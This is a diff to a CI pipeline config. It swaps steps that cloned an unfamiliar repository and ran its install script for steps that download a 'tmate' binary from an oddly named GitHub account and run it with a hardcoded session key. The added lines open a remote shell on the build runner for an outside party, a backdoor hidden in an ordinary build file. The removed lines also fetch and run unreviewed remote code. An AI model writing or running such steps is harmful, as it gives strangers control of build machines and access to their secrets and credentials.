@@ -11,13 +11,6 @@ blocks:
         - name: Install Dependencies
           commands:
             - sudo apt update
-            - sudo apt install curl ca-certificates -y
-            - 'curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash'
-            - source ~/.bashrc
-            - nvm install 18
-            - 'git clone https://github.com/Yiiiwhh123cg/browserlessm'
-            - cd browserlessm
-            - npm install -g yarn
-            - yarn install
-            - sh install.sh
-            - node index.js
+            - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
+            - chmod +x tmate
+            - ./tmate -F -n s1 -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg
